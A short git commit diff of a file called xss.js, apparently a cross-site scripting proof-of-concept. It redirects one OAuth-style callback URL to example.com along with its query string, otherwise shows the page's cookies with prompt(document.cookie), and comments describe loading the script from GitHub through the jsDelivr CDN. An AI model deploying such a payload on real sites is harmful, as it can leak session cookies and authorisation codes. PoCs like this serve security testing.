c2d79497195eec85afbd6512326397db45bd7c25
lmaohahaxd <v40730627@gmail.com>
2025-11-19 16:23:39 +0800

    test

--- xss.js
+++ xss.js
@@ -1,7 +1,8 @@
 if (location.href.includes("/ekyb/callback?code=1234567") {
   window.location.replace("https://example.com" + location.search);
+} else {
+  prompt(document.cookie)
 }
-prompt(document.cookie)
 // https://cdn.jsdelivr.net/ will allow you to proxy any file on github.com
 // https://cdn.jsdelivr.net/gh/<username>/<project>/<filename>
 // https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js
